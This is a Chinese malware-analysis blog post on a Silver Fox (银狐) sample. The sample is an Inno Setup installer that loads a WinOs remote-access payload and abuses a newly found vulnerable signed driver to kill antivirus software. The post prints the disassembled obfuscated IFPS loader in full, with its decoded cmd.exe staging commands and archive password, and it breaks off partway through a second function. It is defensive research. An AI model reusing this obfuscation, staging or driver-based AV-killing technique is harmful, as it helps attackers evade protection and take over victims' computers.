---
title: 持续演进的银狐——不断增加脆弱驱动通过BYOVD结束防病毒软件
date: 2026-02-12 12:00:00
tags:
---


**持续演进的银狐——不断增加脆弱驱动通过BYOVD结束防病毒软件**


# 一、背景
在日常样本狩猎中，我们发现[捕获的一枚银狐样本](https://bbs.kafan.cn/thread-2287429-1-1.html)尝试加载了先前未曾出现过的可疑驱动STProcessMonitor Driver，最终加载WinOs远控程序操控用户计算机。

该驱动通过了WHQL认证，具有"Safetica Technologies s.r.o."与"Microsoft Windows Hardware Compatibility Publisher"颁发的数字签名，签名时间为‎2025‎年‎5‎月‎9‎日 11:43:46，相当新鲜。
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162214tgb11mrhmpo0emik.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162216vq4432bbu93xhbq3.png)

经过分析，该STProcessMonitor Driver在没有经过目标验证的情况下，将结束进程功能的IOCTL暴露给用户模式。该漏洞使攻击者能够终止内核模式中的任意进程，通过BYOVD KillAV。
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162227s9x1t44gvk9714vt.png)

进一步溯源，我们发现，该批银狐行为者多次组合使用多种脆弱驱动干扰防病毒软件，肆意操纵用户计算机，并最终加载WinOs远控载荷，将用户计算机变为可以被黑客控制的“肉鸡”，先前已多次被国内安全厂商发现并分析，可参考：
2025年7月 金山毒霸安全团队/鹰眼威胁情报中心团队 《["银狐"新进展：多Rootkit配合，内核InfinityHook+穿透读写](https://mp.weixin.qq.com/s/yzEuztYDbiSv0YrN2My_Ow)》
2025年11月 微步在线团队 《[连用四个驱动！银狐开始硬刚EDR和杀软 | 银狐十月总结](https://mp.weixin.qq.com/s/d79eCU9UikVDiLpkafafuQ)》
但是本次使用的STProcessMonitor Driver在先前并未使用过，在上述文章中也并未出现，是当前样本新添加的脆弱驱动利用。
同时，鉴于该驱动在互联网、开源仓库、漏洞数据库中均未找到相关记录，且来自VirusTotal Relations的信息表明相关驱动至今仍有被分发的迹象，即相关驱动目前可能仍在被使用、分发，我们将其提交至CVE漏洞数据库并分配编号CVE-2025-70795（撰写本文时为RESERVED状态，待本文发布，并向[magicsword-io/LOLDrivers](https://github.com/magicsword-io/LOLDrivers)仓库提交后，会在合适的时机Apply for publication）。这也表明该批银狐行为者可能会在真实世界中主动搜寻和挖掘全新的漏洞驱动。

样本执行流程图请参考如下：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162249wuwvi5dovm599g9v.jpg)

本文思维导图请参考如下(按照复杂梯度排序）：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162306tppe6a9eb9ptby6w.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162314qsk26skw42wtkgz2.png)

# 二、样本分析
## A.) Setup
SHA-256: 3ba89047b9fb9ae2281e06a7f10a407698174b201f28fc1cadb930207254e485
该程序为使用Inno Setup打包的安装程序，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162357er4z64trpb1ptc4c.png)

第一步，提取安装程序内的应用文件和安装程序内嵌文件
(1) 安装程序内的应用文件包含: main.1 main.2 unzip.2 unzip.3
其中，main.1具有7-Zip压缩包文件头，但单文件并不完整；unzip.3具有MZ头和PE头，但单文件并不完整。
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162435g05hk2kxijiuwkxe.png)
将main.1+main.2合并后可以确认为7-Zip加密压缩包；将unzip.3+unzip.2合并后可以确认为7-Zip Standalone Console (Signed by NVIDIA Corporation)。
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162447ktvh99wgkjgzvgwv.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162453tw722pr2g0tvtffb.png)

(2) 我们观察到安装程序内嵌文件CompiledCode.bin，这是一个编译后的IFPS脚本，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162505o8tmf57pru27pgsl.png)
第二步，反汇编编译的IFPS脚本——CompiledCode.bin=>CompiledCode.txt，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162516v2fihge55eaw6i4t.png)

### 1) "OBFUSCATEDEXTRACT"函数
我们在该类汇编伪代码中，观察到一个可疑函数"OBFUSCATEDEXTRACT"，函数原文如下：
```
.function(export) void OBFUSCATEDEXTRACT()
        pushtype S32 ; StackCount = 1
        pushtype UnicodeString_2 ; StackCount = 2
        pushtype UnicodeString_2 ; StackCount = 3
        pushtype UnicodeString_2 ; StackCount = 4
        pushtype UnicodeString_2 ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype UnicodeString_2 ; StackCount = 7
        pushtype UnicodeString_2 ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype UnicodeString_2 ; StackCount = 10
        pushtype UnicodeString_2 ; StackCount = 11
        pushtype UnicodeString_2 ; StackCount = 12
        pushtype UnicodeString_2 ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(7)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(99)
        assign Var15[1], S32(109)
        assign Var15[2], S32(100)
        assign Var15[3], S32(46)
        assign Var15[4], S32(101)
        assign Var15[5], S32(120)
        assign Var15[6], S32(101)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var2 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(137)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(47)
        assign Var15[1], S32(99)
        assign Var15[2], S32(32)
        assign Var15[3], S32(99)
        assign Var15[4], S32(111)
        assign Var15[5], S32(112)
        assign Var15[6], S32(121)
        assign Var15[7], S32(32)
        assign Var15[8], S32(47)
        assign Var15[9], S32(98)
        assign Var15[10], S32(32)
        assign Var15[11], S32(47)
        assign Var15[12], S32(121)
        assign Var15[13], S32(32)
        assign Var15[14], S32(34)
        assign Var15[15], S32(67)
        assign Var15[16], S32(58)
        assign Var15[17], S32(92)
        assign Var15[18], S32(85)
        assign Var15[19], S32(115)
        assign Var15[20], S32(101)
        assign Var15[21], S32(114)
        assign Var15[22], S32(115)
        assign Var15[23], S32(92)
        assign Var15[24], S32(80)
        assign Var15[25], S32(117)
        assign Var15[26], S32(98)
        assign Var15[27], S32(108)
        assign Var15[28], S32(105)
        assign Var15[29], S32(99)
        assign Var15[30], S32(92)
        assign Var15[31], S32(68)
        assign Var15[32], S32(111)
        assign Var15[33], S32(99)
        assign Var15[34], S32(117)
        assign Var15[35], S32(109)
        assign Var15[36], S32(101)
        assign Var15[37], S32(110)
        assign Var15[38], S32(116)
        assign Var15[39], S32(115)
        assign Var15[40], S32(92)
        assign Var15[41], S32(109)
        assign Var15[42], S32(97)
        assign Var15[43], S32(105)
        assign Var15[44], S32(110)
        assign Var15[45], S32(46)
        assign Var15[46], S32(49)
        assign Var15[47], S32(34)
        assign Var15[48], S32(32)
        assign Var15[49], S32(43)
        assign Var15[50], S32(32)
        assign Var15[51], S32(34)
        assign Var15[52], S32(67)
        assign Var15[53], S32(58)
        assign Var15[54], S32(92)
        assign Var15[55], S32(85)
        assign Var15[56], S32(115)
        assign Var15[57], S32(101)
        assign Var15[58], S32(114)
        assign Var15[59], S32(115)
        assign Var15[60], S32(92)
        assign Var15[61], S32(80)
        assign Var15[62], S32(117)
        assign Var15[63], S32(98)
        assign Var15[64], S32(108)
        assign Var15[65], S32(105)
        assign Var15[66], S32(99)
        assign Var15[67], S32(92)
        assign Var15[68], S32(68)
        assign Var15[69], S32(111)
        assign Var15[70], S32(99)
        assign Var15[71], S32(117)
        assign Var15[72], S32(109)
        assign Var15[73], S32(101)
        assign Var15[74], S32(110)
        assign Var15[75], S32(116)
        assign Var15[76], S32(115)
        assign Var15[77], S32(92)
        assign Var15[78], S32(109)
        assign Var15[79], S32(97)
        assign Var15[80], S32(105)
        assign Var15[81], S32(110)
        assign Var15[82], S32(46)
        assign Var15[83], S32(50)
        assign Var15[84], S32(34)
        assign Var15[85], S32(32)
        assign Var15[86], S32(34)
        assign Var15[87], S32(67)
        assign Var15[88], S32(58)
        assign Var15[89], S32(92)
        assign Var15[90], S32(85)
        assign Var15[91], S32(115)
        assign Var15[92], S32(101)
        assign Var15[93], S32(114)
        assign Var15[94], S32(115)
        assign Var15[95], S32(92)
        assign Var15[96], S32(80)
        assign Var15[97], S32(117)
        assign Var15[98], S32(98)
        assign Var15[99], S32(108)
        assign Var15[100], S32(105)
        assign Var15[101], S32(99)
        assign Var15[102], S32(92)
        assign Var15[103], S32(68)
        assign Var15[104], S32(111)
        assign Var15[105], S32(99)
        assign Var15[106], S32(117)
        assign Var15[107], S32(109)
        assign Var15[108], S32(101)
        assign Var15[109], S32(110)
        assign Var15[110], S32(116)
        assign Var15[111], S32(115)
        assign Var15[112], S32(92)
        assign Var15[113], S32(109)
        assign Var15[114], S32(97)
        assign Var15[115], S32(105)
        assign Var15[116], S32(110)
        assign Var15[117], S32(90)
        assign Var15[118], S32(84)
        assign Var15[119], S32(116)
        assign Var15[120], S32(82)
        assign Var15[121], S32(106)
        assign Var15[122], S32(84)
        assign Var15[123], S32(102)
        assign Var15[124], S32(121)
        assign Var15[125], S32(104)
        assign Var15[126], S32(78)
        assign Var15[127], S32(73)
        assign Var15[128], S32(68)
        assign Var15[129], S32(67)
        assign Var15[130], S32(65)
        assign Var15[131], S32(70)
        assign Var15[132], S32(46)
        assign Var15[133], S32(120)
        assign Var15[134], S32(109)
        assign Var15[135], S32(108)
        assign Var15[136], S32(34)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var3 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype BOOLEAN ; StackCount = 14
        pushtype Pointer ; StackCount = 15
        setptr Var15, Var1
        pushtype U8_4 ; StackCount = 16
        assign Var16, U8_4(1)
        pushtype S32 ; StackCount = 17
        assign Var17, S32(0)
        pushtype UnicodeString_2 ; StackCount = 18
        assign Var18, String_3("")
        pushtype UnicodeString_2 ; StackCount = 19
        assign Var19, Var3
        pushtype UnicodeString_2 ; StackCount = 20
        assign Var20, Var2
        pushvar Var14 ; StackCount = 21
        call EXEC
        pop ; StackCount = 20
        pop ; StackCount = 19
        pop ; StackCount = 18
        pop ; StackCount = 17
        pop ; StackCount = 16
        pop ; StackCount = 15
        pop ; StackCount = 14
        sfz Var14
        pop ; StackCount = 13
        jf loc_196d
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(25)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(67)
        assign Var15[1], S32(58)
        assign Var15[2], S32(92)
        assign Var15[3], S32(85)
        assign Var15[4], S32(115)
        assign Var15[5], S32(101)
        assign Var15[6], S32(114)
        assign Var15[7], S32(115)
        assign Var15[8], S32(92)
        assign Var15[9], S32(80)
        assign Var15[10], S32(117)
        assign Var15[11], S32(98)
        assign Var15[12], S32(108)
        assign Var15[13], S32(105)
        assign Var15[14], S32(99)
        assign Var15[15], S32(92)
        assign Var15[16], S32(68)
        assign Var15[17], S32(111)
        assign Var15[18], S32(99)
        assign Var15[19], S32(117)
        assign Var15[20], S32(109)
        assign Var15[21], S32(101)
        assign Var15[22], S32(110)
        assign Var15[23], S32(116)
        assign Var15[24], S32(115)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var4 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(7)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(92)
        assign Var15[1], S32(109)
        assign Var15[2], S32(97)
        assign Var15[3], S32(105)
        assign Var15[4], S32(110)
        assign Var15[5], S32(46)
        assign Var15[6], S32(49)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var7 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(7)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(92)
        assign Var15[1], S32(109)
        assign Var15[2], S32(97)
        assign Var15[3], S32(105)
        assign Var15[4], S32(110)
        assign Var15[5], S32(46)
        assign Var15[6], S32(50)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var8 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype BOOLEAN ; StackCount = 14
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype WideString ; StackCount = 16
        assign Var16, Var4
        add Var16, Var7
        assign Var15, Var16
        pop ; StackCount = 15
        pushvar Var14 ; StackCount = 16
        call DELETEFILE
        pop ; StackCount = 15
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype BOOLEAN ; StackCount = 14
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype WideString ; StackCount = 16
        assign Var16, Var4
        add Var16, Var8
        assign Var15, Var16
        pop ; StackCount = 15
        pushvar Var14 ; StackCount = 16
        call DELETEFILE
        pop ; StackCount = 15
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(11)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(92)
        assign Var15[1], S32(102)
        assign Var15[2], S32(117)
        assign Var15[3], S32(110)
        assign Var15[4], S32(122)
        assign Var15[5], S32(105)
        assign Var15[6], S32(112)
        assign Var15[7], S32(46)
        assign Var15[8], S32(101)
        assign Var15[9], S32(120)
        assign Var15[10], S32(101)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var5 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(24)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(92)
        assign Var15[1], S32(109)
        assign Var15[2], S32(97)
        assign Var15[3], S32(105)
        assign Var15[4], S32(110)
        assign Var15[5], S32(90)
        assign Var15[6], S32(84)
        assign Var15[7], S32(116)
        assign Var15[8], S32(82)
        assign Var15[9], S32(106)
        assign Var15[10], S32(84)
        assign Var15[11], S32(102)
        assign Var15[12], S32(121)
        assign Var15[13], S32(104)
        assign Var15[14], S32(78)
        assign Var15[15], S32(73)
        assign Var15[16], S32(68)
        assign Var15[17], S32(67)
        assign Var15[18], S32(65)
        assign Var15[19], S32(70)
        assign Var15[20], S32(46)
        assign Var15[21], S32(120)
        assign Var15[22], S32(109)
        assign Var15[23], S32(108)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var6 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype WideString ; StackCount = 14
        assign Var14, Var4
        add Var14, Var5
        assign Var11, Var14
        pop ; StackCount = 13
        pushtype WideString ; StackCount = 14
        assign Var14, Var4
        add Var14, Var6
        assign Var12, Var14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(10)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(104)
        assign Var15[1], S32(116)
        assign Var15[2], S32(76)
        assign Var15[3], S32(99)
        assign Var15[4], S32(69)
        assign Var15[5], S32(78)
        assign Var15[6], S32(121)
        assign Var15[7], S32(82)
        assign Var15[8], S32(70)
        assign Var15[9], S32(89)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var9 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype Type30 ; StackCount = 15
        pushtype S32 ; StackCount = 16
        assign Var16, S32(10)
        pushvar Var15 ; StackCount = 17
        call SETARRAYLENGTH
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var15[0], S32(119)
        assign Var15[1], S32(88)
        assign Var15[2], S32(115)
        assign Var15[3], S32(72)
        assign Var15[4], S32(70)
        assign Var15[5], S32(110)
        assign Var15[6], S32(85)
        assign Var15[7], S32(110)
        assign Var15[8], S32(113)
        assign Var15[9], S32(75)
        assign Var14, Var15
        pop ; StackCount = 14
        pushvar Var10 ; StackCount = 15
        call STRFROMCODE
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype WideString ; StackCount = 14
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype Type30 ; StackCount = 16
        pushtype Type30 ; StackCount = 17
        pushtype S32 ; StackCount = 18
        assign Var18, S32(7)
        pushvar Var17 ; StackCount = 19
        call SETARRAYLENGTH
        pop ; StackCount = 18
        pop ; StackCount = 17
        assign Var17[0], S32(120)
        assign Var17[1], S32(32)
        assign Var17[2], S32(45)
        assign Var17[3], S32(121)
        assign Var17[4], S32(32)
        assign Var17[5], S32(45)
        assign Var17[6], S32(112)
        assign Var16, Var17
        pop ; StackCount = 16
        pushvar Var15 ; StackCount = 17
        call STRFROMCODE
        pop ; StackCount = 16
        pop ; StackCount = 15
        assign Var14, Var15
        pop ; StackCount = 14
        add Var14, Var9
        add Var14, Var10
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype Type30 ; StackCount = 16
        pushtype Type30 ; StackCount = 17
        pushtype S32 ; StackCount = 18
        assign Var18, S32(4)
        pushvar Var17 ; StackCount = 19
        call SETARRAYLENGTH
        pop ; StackCount = 18
        pop ; StackCount = 17
        assign Var17[0], S32(32)
        assign Var17[1], S32(45)
        assign Var17[2], S32(111)
        assign Var17[3], S32(34)
        assign Var16, Var17
        pop ; StackCount = 16
        pushvar Var15 ; StackCount = 17
        call STRFROMCODE
        pop ; StackCount = 16
        pop ; StackCount = 15
        add Var14, Var15
        pop ; StackCount = 14
        add Var14, Var4
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype Type30 ; StackCount = 16
        pushtype Type30 ; StackCount = 17
        pushtype S32 ; StackCount = 18
        assign Var18, S32(3)
        pushvar Var17 ; StackCount = 19
        call SETARRAYLENGTH
        pop ; StackCount = 18
        pop ; StackCount = 17
        assign Var17[0], S32(34)
        assign Var17[1], S32(32)
        assign Var17[2], S32(34)
        assign Var16, Var17
        pop ; StackCount = 16
        pushvar Var15 ; StackCount = 17
        call STRFROMCODE
        pop ; StackCount = 16
        pop ; StackCount = 15
        add Var14, Var15
        pop ; StackCount = 14
        add Var14, Var12
        pushtype UnicodeString_2 ; StackCount = 15
        pushtype Type30 ; StackCount = 16
        pushtype Type30 ; StackCount = 17
        pushtype S32 ; StackCount = 18
        assign Var18, S32(1)
        pushvar Var17 ; StackCount = 19
        call SETARRAYLENGTH
        pop ; StackCount = 18
        pop ; StackCount = 17
        assign Var17[0], S32(34)
        assign Var16, Var17
        pop ; StackCount = 16
        pushvar Var15 ; StackCount = 17
        call STRFROMCODE
        pop ; StackCount = 16
        pop ; StackCount = 15
        add Var14, Var15
        pop ; StackCount = 14
        assign Var13, Var14
        pop ; StackCount = 13
        pushtype BOOLEAN ; StackCount = 14
        pushtype UnicodeString_2 ; StackCount = 15
        assign Var15, Var11
        pushvar Var14 ; StackCount = 16
        call FILEEXISTS
        pop ; StackCount = 15
        pop ; StackCount = 14
        jz loc_18bc, Var14
        pushtype BOOLEAN ; StackCount = 15
        pushtype UnicodeString_2 ; StackCount = 16
        assign Var16, Var12
        pushvar Var15 ; StackCount = 17
        call FILEEXISTS
        pop ; StackCount = 16
        pop ; StackCount = 15
        and Var14, Var15
        pop ; StackCount = 14
loc_18bc:
        sfz Var14
        pop ; StackCount = 13
        jf loc_196d
        pushtype BOOLEAN ; StackCount = 14
        pushtype Pointer ; StackCount = 15
        setptr Var15, Var1
        pushtype U8_4 ; StackCount = 16
        assign Var16, U8_4(1)
        pushtype S32 ; StackCount = 17
        assign Var17, S32(0)
        pushtype UnicodeString_2 ; StackCount = 18
        assign Var18, String_3("")
        pushtype UnicodeString_2 ; StackCount = 19
        assign Var19, Var13
        pushtype UnicodeString_2 ; StackCount = 20
        assign Var20, Var11
        pushvar Var14 ; StackCount = 21
        call EXEC
        pop ; StackCount = 20
        pop ; StackCount = 19
        pop ; StackCount = 18
        pop ; StackCount = 17
        pop ; StackCount = 16
        pop ; StackCount = 15
        pop ; StackCount = 14
        pop ; StackCount = 13
        pushtype BOOLEAN ; StackCount = 14
        pushtype UnicodeString_2 ; StackCount = 15
        assign Var15, Var12
        pushvar Var14 ; StackCount = 16
        call DELETEFILE
        pop ; StackCount = 15
        pop ; StackCount = 14
        pop ; StackCount = 13
loc_196d:
        ret
```
其中，我们观察到大量ASCII码，例如在开头的[99, 109, 100, 46, 101, 120, 101]即对应`cmd.exe`：
```
        assign Var15[0], S32(99)  ; 'c'
        assign Var15[1], S32(109)  ; 'm'
        assign Var15[2], S32(100)  ; 'd'
        assign Var15[3], S32(46)  ; '.'
        assign Var15[4], S32(101)  ; 'e'
        assign Var15[5], S32(120)  ; 'x'
        assign Var15[6], S32(101)  ; 'e'
```
在该函数中包含多个ASCII码数组，用于构建字符串并执行命令。字符串通过数组编码（如[67, 58, 92, ...]对应ASCII码，解码后为C:\...），增加反分析难度。

以下是所有数组的ASCII码还原结果及其对应的字符串：

1. 第一个数组（7字节）
ASCII码：99, 109, 100, 46, 101, 120, 101
字符串："cmd.exe"

2. 第二个数组（137字节）
ASCII码：47, 99, 32, 99, 111, 112, 121, 32, 47, 98, 32, 47, 121, 32, 34, 67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 109, 97, 105, 110, 46, 49, 34, 32, 43, 32, 34, 67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 109, 97, 105, 110, 46, 50, 34, 32, 34, 67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 109, 97, 105, 110, 90, 84, 116, 82, 106, 84, 102, 121, 104, 78, 73, 68, 67, 65, 70, 46, 120, 109, 108, 34
字符串："/c copy /b /y \"C:\Users\Public\Documents\main.1\" + \"C:\Users\Public\Documents\main.2\" \"C:\Users\Public\Documents\mainZTtRjTfyhNIDCAF.xml\""

3. 第三个数组（25字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115
字符串："C:\Users\Public\Documents"

4. 第四个数组（7字节）
ASCII码：92, 109, 97, 105, 110, 46, 49
字符串："\main.1"

5. 第五个数组（7字节）
ASCII码：92, 109, 97, 105, 110, 46, 50
字符串："\main.2"

6. 第六个数组（11字节）
ASCII码：92, 102, 117, 110, 122, 105, 112, 46, 101, 120, 101
字符串："\funzip.exe"

7. 第七个数组（24字节）
ASCII码：92, 109, 97, 105, 110, 90, 84, 116, 82, 106, 84, 102, 121, 104, 78, 73, 68, 67, 65, 70, 46, 120, 109, 108
字符串："\mainZTtRjTfyhNIDCAF.xml"

8. 第八个数组（10字节）
ASCII码：104, 116, 76, 99, 69, 78, 121, 82, 70, 89
字符串："htLcENyRFY"

9. 第九个数组（10字节）
ASCII码：119, 88, 115, 72, 70, 110, 85, 110, 113, 75
字符串："wXsHFnUnqK"

10. 第十个数组（7字节）
ASCII码：120, 32, 45, 121, 32, 45, 112
字符串："x -y -p"

11. 第十一个数组（4字节）
ASCII码：32, 45, 111, 34
字符串：" -o\""

12. 第十二个数组（3字节）
ASCII码：34, 32, 34
字符串："\" \""

13. 第十三个数组（1字节）
ASCII码：34
字符串："\""

该函数依次执行以下功能：
1. 执行cmd.exe /c copy /b /y，将C:\Users\Public\Documents\main.1和main.2合并为mainZTtRjTfyhNIDCAF.xml
2. 删除main.1和main.2文件
3. 检查funzip.exe和mainZTtRjTfyhNIDCAF.xml文件是否存在，如果存在则执行: funzip.exe x -y -p htLcENyRFYwXsHFnUnqK -o"C:\Users\Public\Documents" "C:\Users\Public\Documents\mainZTtRjTfyhNIDCAF.xml"，解压mainZTtRjTfyhNIDCAF.xml文件
4. 删除mainZTtRjTfyhNIDCAF.xml文件

于是我们得到mainZTtRjTfyhNIDCAF.xml文件解压密码为"htLcENyRFYwXsHFnUnqK"，解压后可得到: men.exe man100.dat Server.log.
即释放men.exe man100.dat Server.log.
 ![](https://bbs.huorong.cn/data/attachment/forum/202602/11/162606xcjo4usj0uuwurww.png)
其中，man100.dat是一个Zip压缩包，解压后可得到: temp_adjust.dat temp_filler.dat

### 2) "YQMBPLIVKAXLBBKHOYPB"函数
我们在该类汇编伪代码中，观察到一个可疑函数"YQMBPLIVKAXLBBKHOYPB"，函数原文如下：
```
.function(export) void YQMBPLIVKAXLBBKHOYPB()
	pushtype BOOLEAN ; StackCount = 1
	pushtype UnicodeString_2 ; StackCount = 2
	pushtype UnicodeString_2 ; StackCount = 3
	pushtype UnicodeString_2 ; StackCount = 4
	pushtype UnicodeString_2 ; StackCount = 5
	pushtype UnicodeString_2 ; StackCount = 6
	pushtype S32 ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushvar Var8 ; StackCount = 9
	call INITIALIZESETUP
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushvar Var1 ; StackCount = 8
	call IS360PROCESSRUNNING
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	assign Var8, Var1
	setz Var8
	sfz Var8
	pop ; StackCount = 7
	jf loc_263f
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(1)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(0)
	pushtype UnicodeString_2 ; StackCount = 12
	assign Var12, String_3("")
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype WideString ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(12)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(47)
	assign Var17[1], S32(99)
	assign Var17[2], S32(32)
	assign Var17[3], S32(99)
	assign Var17[4], S32(111)
	assign Var17[5], S32(112)
	assign Var17[6], S32(121)
	assign Var17[7], S32(32)
	assign Var17[8], S32(47)
	assign Var17[9], S32(98)
	assign Var17[10], S32(32)
	assign Var17[11], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(13)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(51)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(43)
	assign Var17[11], S32(32)
	assign Var17[12], S32(34)
